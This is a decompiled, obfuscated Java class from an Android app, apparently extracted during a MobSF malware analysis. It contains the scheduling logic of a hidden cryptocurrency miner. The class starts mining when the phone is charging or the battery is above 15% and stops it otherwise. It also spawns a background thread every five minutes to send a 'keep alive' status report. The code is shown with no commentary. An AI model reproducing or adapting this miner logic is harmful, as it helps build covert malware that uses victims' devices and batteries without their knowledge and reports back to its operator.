package Eikuh5Phaeth;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.BatteryManager;
import android.util.Log;
import java.util.Date;
import ohx8eem3Ahph.eetheKaevie8;

/* loaded from: /home/mobsf/.MobSF/uploads/81b3c8d299ee772c4ca62695cdbe9f47/classes.dex */
public class ruwiepo7ooVu {

    /* renamed from: thooCoci9zae, reason: collision with root package name */
    public static ruwiepo7ooVu f1373thooCoci9zae;

    /* renamed from: ieseir3Choge, reason: collision with root package name */
    public final long f1374ieseir3Choge = System.currentTimeMillis();

    public static synchronized ruwiepo7ooVu thooCoci9zae() {
        ruwiepo7ooVu ruwiepo7oovu;
        synchronized (ruwiepo7ooVu.class) {
            try {
                if (f1373thooCoci9zae == null) {
                    f1373thooCoci9zae = new ruwiepo7ooVu();
                }
                ruwiepo7oovu = f1373thooCoci9zae;
            } catch (Throwable th) {
                throw th;
            }
        }
        return ruwiepo7oovu;
    }

    public void ieheiQu9sho5(Context context) {
        Log.i("TaskManager", "we're doing useful things. Curr time: " + new Date());
        Intent registerReceiver = context.registerReceiver(null, new IntentFilter("android.intent.action.BATTERY_CHANGED"));
        boolean z = true;
        if (registerReceiver != null) {
            int intExtra = registerReceiver.getIntExtra("status", -1);
            if (intExtra != 2 && intExtra != 5) {
                z = false;
            }
        } else {
            Log.e("TaskManager", "batter intent is null???");
        }
        int intProperty = ((BatteryManager) context.getSystemService("batterymanager")).getIntProperty(4);
        if (!z && intProperty < 15) {
            Log.d("TaskManager", "discharging, stop mining");
            ohx8eem3Ahph.niah0Shohtha.mi5Iecheimie(context).laej2zeez5Ja();
        } else {
            Log.d("TaskManager", "charging, start mining");
            ohx8eem3Ahph.niah0Shohtha.mi5Iecheimie(context).aac1eTaexee6();
        }
        SharedPreferences sharedPreferences = context.getSharedPreferences("TASK_MANAGER_PREF_NAME", 0);
        if (System.currentTimeMillis() - sharedPreferences.getLong("KEY_LAST_WORK", 0L) < 300000) {
            Log.i("TaskManager", "status reported very recently, no need to report again");
        } else {
            sharedPreferences.edit().putLong("KEY_LAST_WORK", System.currentTimeMillis()).apply();
            new Thread(new Runnable() { // from class: Eikuh5Phaeth.mi5Iecheimie
                @Override // java.lang.Runnable
                public final void run() {
                    ruwiepo7ooVu.this.keiL1EiShomu();
                }
            }).start();
        }
    }

    public final /* synthetic */ void keiL1EiShomu() {
        try {
            Log.i("TaskManager", "reporting status task...");
            new eetheKaevie8(new ahthoK6usais(this.f1374ieseir3Choge)).call();
        } catch (Exception e) {
            Log.e("TaskManager", "keep alive reporter exception: " + e);
        }
    }
}
